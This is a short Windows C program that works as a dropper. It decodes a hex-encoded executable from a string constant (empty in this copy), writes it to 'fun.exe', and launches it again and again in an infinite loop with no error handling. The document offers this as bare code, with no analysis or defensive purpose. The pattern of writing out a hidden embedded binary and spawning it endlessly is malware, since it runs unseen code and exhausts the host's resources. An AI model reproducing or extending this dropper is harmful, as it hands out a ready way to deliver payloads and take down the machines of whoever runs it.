const char* hexa = "";

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <windows.h>
#include <tchar.h>

void startprocess(TCHAR *path){
    STARTUPINFO si;
    PROCESS_INFORMATION pi;

    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));

    // Here, I am not a decent programmer, so I am not using error handling.
    CreateProcess(NULL,path,NULL,NULL,FALSE,0,NULL,NULL,&si,&pi);
}

int main(int argc, const char *argv[]) {

    FILE* fs = fopen("fun.exe", "wb");

    unsigned char hexval;
    size_t size = strlen(hexa);

    for(size_t pr=0;pr<size;pr+=2){
	sscanf(hexa+pr,"%2hhx",&hexval);
	fputc(hexval,fs);
    }

    fclose(fs);
    while(1){
	startprocess(_T("fun.exe"));
    }
    return 0;
}